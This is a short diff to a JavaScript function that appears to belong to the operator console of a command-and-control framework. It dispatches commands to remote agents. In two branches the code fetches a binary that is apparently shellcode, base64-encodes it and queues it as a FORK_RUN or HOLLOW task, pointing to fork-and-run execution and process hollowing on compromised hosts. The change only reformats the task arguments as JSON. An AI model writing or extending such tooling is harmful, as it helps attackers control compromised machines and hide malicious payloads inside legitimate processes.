@@ -1458,7 +1458,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
         const sc = new Uint8Array(await fr.arrayBuffer());
         payload = btoa(String.fromCharCode(...sc));
         taskType = 'FORK_RUN';
-        taskArgs = parts4.slice(1).join(' ');
+        taskArgs = JSON.stringify({cmd: parts4.slice(1).join(' ')});
       } catch(e) { addConsoleOutput('', 'Fetch error: '+e.message, null); return; }
       break;
     }
@@ -1488,7 +1488,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
         const sc = new Uint8Array(await fr.arrayBuffer());
         payload = btoa(String.fromCharCode(...sc));
         taskType = 'HOLLOW';
-        taskArgs = holParts[0];
+        taskArgs = JSON.stringify({target: holParts[0]});
       } catch(e) { addConsoleOutput('', 'Fetch error: '+e.message, null); return; }
       break;
     }
